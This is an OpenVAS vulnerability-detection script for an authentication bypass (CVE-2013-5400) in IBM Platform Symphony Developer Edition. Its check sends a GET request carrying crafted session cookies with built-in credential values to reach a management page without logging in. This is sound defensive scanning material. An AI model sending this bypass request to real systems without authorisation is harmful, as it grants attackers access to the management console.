##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ibm_platform_symphony_dev_edi_auth_bypass_vuln.nasl 6769 2017-07-20 09:56:33Z teissa $
#
# IBM Platform Symphony Developer Edition Authentication Bypass Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.804240";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 6769 $");
  script_cve_id("CVE-2013-5400");
  script_bugtraq_id(65616);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-07-20 11:56:33 +0200 (Thu, 20 Jul 2017) $");
  script_tag(name:"creation_date", value:"2014-02-19 11:25:08 +0530 (Wed, 19 Feb 2014)");
  script_name("IBM Platform Symphony Developer Edition Authentication Bypass Vulnerability");

  tag_summary =
"This host is running IBM Platform Symphony Developer Edition and is prone to
authentication bypass vulnerability.";

  tag_vuldetect =
"Send a crafted exploit string via HTTP GET request and check whether it is
able to read the string or not.";

  tag_insight =
"The flaw is in a servlet in the application, which authenticates a user with
built-in credentials.";

  tag_impact =
"Successful exploitation will allow remote attackers to gain access to the
local environment.

Impact Level: Application.";

  tag_affected =
"IBM Platform Symphony Developer Edition 5.2 and 6.1.x through 6.1.1";

  tag_solution =
"Apply the workaround from below link,
http://www-01.ibm.com/support/docview.wss?uid=isg3T1020564";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "solution" , value : tag_solution);

  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/87296");
  script_xref(name : "URL" , value : "http://www-01.ibm.com/support/docview.wss?uid=isg3T1020564");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 18080);
  exit(0);
}


##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
url = "";
ibmPort = "";
ibmReq = "";
ibmRes = "";

## Get HTTP Port
ibmPort = get_http_port(default:18080);
if(!ibmPort){
  ibmPort = 18080;
}

## Check Port State
if(!get_port_state(ibmPort)){
  exit(0);
}

## Send and Receive the response
ibmReq = http_get(item:"/platform/index_de.jsp", port:ibmPort);
ibmRes = http_keepalive_send_recv(port:ibmPort, data:ibmReq, bodyonly:TRUE);

## Confirm the application before trying exploit
if(">Welcome to IBM Platform Management Console<" >< ibmRes &&
   "Symphony Developer Edition" >< ibmRes)
{
  url = '/symgui/framework/main.action';
  cookie = 'JSESSIONID=A7D2D8F02709BEC35B4DB60C979EE92B; platform.username=\r\n' +
           'OG0Q3YUPHWw="; DE_GUIplatform.username="OG0Q3YUPHWw=";\r\n' +
           'DE_GUIplatform.password="OG0Q3YUPHWw=";\r\n' +
           'DE_GUIplatform.descookie="";\r\n' +
           'DE_GUIplatform.token=testToken; DE_GUIplatform.userrole=1;\r\n' +
           'DE_GUIplatform.logindate=1392792773887;\r\n' +
           'DE_GUIplatform.renewtoken=1392794573887';

  host = get_host_name();

  ibmReq = string("GET ",url," HTTP/1.0\r\n",
               "Host: " + host + ":18080\r\n",
               "Cookie: ",cookie,"\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n\r\n");
  ibmRes = http_send_recv(port:ibmPort, data:ibmReq,bodyonly:TRUE);

  if(ibmRes && "IBM Platform Symphony Developer Edition" >< ibmRes &&
     "\/symgui\/pmr\/workload\/toapplicationsummary.action" >< ibmRes)
  {
    security_message(ibmPort);
    exit(0);
  }
}
